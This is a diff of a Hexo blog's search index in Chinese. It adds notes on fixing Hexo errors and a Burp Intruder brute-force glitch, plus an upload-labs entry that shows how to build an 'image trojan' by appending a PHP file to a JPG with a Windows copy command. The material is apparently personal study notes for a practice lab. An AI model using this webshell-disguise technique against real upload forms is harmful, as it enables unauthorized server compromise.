-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xjm850552586&#x2F;article&#x2F;details&#x2F;84101345?ops_request_misc&#x3D;%25257B%252522request%25255Fid%252522%25253A%252522161371871416780266219548%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id&#x3D;161371871416780266219548&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-84101345.pc_search_result_before_js&amp;utm_term&#x3D;hexo%25E5%259B%25BE%25E7%2589%2587</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>之后本地只需在文件的相同名文件夹下保存图片，然后markdown编辑时直接添加图片即可啦。</p>
-<p>注意：文章和同名文件夹需要在同一目录下，否则会显示丢失路径。</p>
-<h4 id="burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法"><a href="#burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法" class="headerlink" title="burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法"></a>burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法</h4><p>如果点击start attrack 后出现 Payload set 1: Invalid number settings 的提示，先点hex 后点 decimal 再开始start attrack，这是一个软件bug，需要手动让它刷新。<br><img src="https://img-blog.csdnimg.cn/20190901085439370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190901085447734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <tags>
-        <tag>博客</tag>
-      </tags>
   </entry>
   <entry>
     <title>密码学</title>
@@ -1136,6 +1095,30 @@ cookie信息盗取可以直接登录-->]]></content>
       </tags>
   </entry>
   <entry>
+    <title>博客解疑</title>
+    <url>/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/</url>
+    <content><![CDATA[<h4 id="当输入hexo-s-g发布博文并预览时出现下面的提示："><a href="#当输入hexo-s-g发布博文并预览时出现下面的提示：" class="headerlink" title="当输入hexo s -g发布博文并预览时出现下面的提示："></a>当输入hexo s -g发布博文并预览时出现下面的提示：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line x, column y:</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>报错信息是提示hexo的yml配置文件 冒号后面少了空格 解决方案：到提示行将对应的空格补上即可。</p>
+<h4 id="hexo-s-时出现报错"><a href="#hexo-s-时出现报错" class="headerlink" title="hexo s 时出现报错"></a>hexo s 时出现报错</h4><p>Port 4000 has been used. Try other port instead.</p>
+<p>分析了一下，应该是我恰巧同时使用PHP study和hexo静态页面，所以占用了端口，查找文章获得方法：</p>
+<p>可以在站点下的文件_config.yml内加上如下代码更改hexo-server运行时的端口号：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 4001 #端口号随意，默认是4000</span><br><span class="line">  compress: true</span><br><span class="line">  header: true</span><br></pre></td></tr></table></figure>
+
+<h4 id="About-photograph"><a href="#About-photograph" class="headerlink" title="About photograph"></a>About photograph</h4><p>今天再次尝试博客上传图片（好吧，都是因为之前自己不断失败，苦笑ing）</p>
+<p>重新看了下csdn上一篇好文章</p>
+<p>附上链接：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xjm850552586&#x2F;article&#x2F;details&#x2F;84101345?ops_request_misc&#x3D;%25257B%252522request%25255Fid%252522%25253A%252522161371871416780266219548%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id&#x3D;161371871416780266219548&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-84101345.pc_search_result_before_js&amp;utm_term&#x3D;hexo%25E5%259B%25BE%25E7%2589%2587</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>之后本地只需在文件的相同名文件夹下保存图片，然后markdown编辑时直接添加图片即可啦。</p>
+<p>注意：文章和同名文件夹需要在同一目录下，否则会显示丢失路径。</p>
+<h4 id="burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法"><a href="#burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法" class="headerlink" title="burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法"></a>burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法</h4><p>如果点击start attrack 后出现 Payload set 1: Invalid number settings 的提示，先点hex 后点 decimal 再开始start attrack，这是一个软件bug，需要手动让它刷新。<br><img src="https://img-blog.csdnimg.cn/20190901085439370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190901085447734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <tags>
+        <tag>博客</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>汇编基础知识</title>
     <url>/2021/01/22/x/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
     <content><![CDATA[<h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p>了解硬件系统的结构，重点：利用硬件系统的编程结构和指令</p>
@@ -1154,6 +1137,23 @@ cookie信息盗取可以直接登录-->]]></content>
 ]]></content>
       <tags>
         <tag>vmware</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>图片马</title>
+    <url>/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
+    <content><![CDATA[<p>  1.打开windows命令控制台，cd到图片与文件同在路径下</p>
+<p>  如 1.jpg与 2.php同在桌面，则：</p>
+<p>  cd   desktop</p>
+<ol start="2">
+<li><p>输入指令：copy  1.jpg/b  +  2.php/a  shell,jpg   之后回车，那么形成的图片马文件就会出现在自己的桌面上。</p>
+<p><img src="/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p>
+<p>​    </p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>upload-labs</tag>
       </tags>
   </entry>
   <entry>
